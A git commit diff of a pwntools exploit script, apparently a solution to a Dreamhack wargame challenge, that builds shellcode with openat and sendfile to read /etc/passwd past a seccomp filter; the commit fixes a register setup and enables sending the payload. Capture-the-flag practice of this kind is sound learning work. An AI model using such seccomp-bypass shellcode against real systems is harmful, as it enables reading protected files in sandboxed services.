bc3c9035102c98fdbfd40400868e2c190baaf258
ubuntu <lovehk2002@gmail.com>
2024-10-15 06:46:26 +0000

    command injection update

--- System_Hack_Advanced/1.seccomp/Bypass_seccomp/bypass_seccomp.py
+++ System_Hack_Advanced/1.seccomp/Bypass_seccomp/bypass_seccomp.py
@@ -3,13 +3,9 @@
 from pwn import *
 context.arch = 'x86_64'
 p = process('./bypass_seccomp')
-# p = remote('host3.dreamhack.games', 14748)
 shellcode = shellcraft.openat(0, '/etc/passwd')
-shellcode += 'mov r10, 0xffff'
-print(shellcraft.sendfile(1, 'rax', 0))
-print("--------------")
-print(shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d',''))
-shellcode += shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d','')
+#shellcode += 'mov r10, 0xffff'
+shellcode += shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d','mov r10, 0xffff') # openat 반환값 주소가 'rax' 레지스터에 저장되어 있음
 shellcode += shellcraft.exit(0)
-# p.sendline(asm(shellcode))
+p.sendline(asm(shellcode))
 p.interactive()
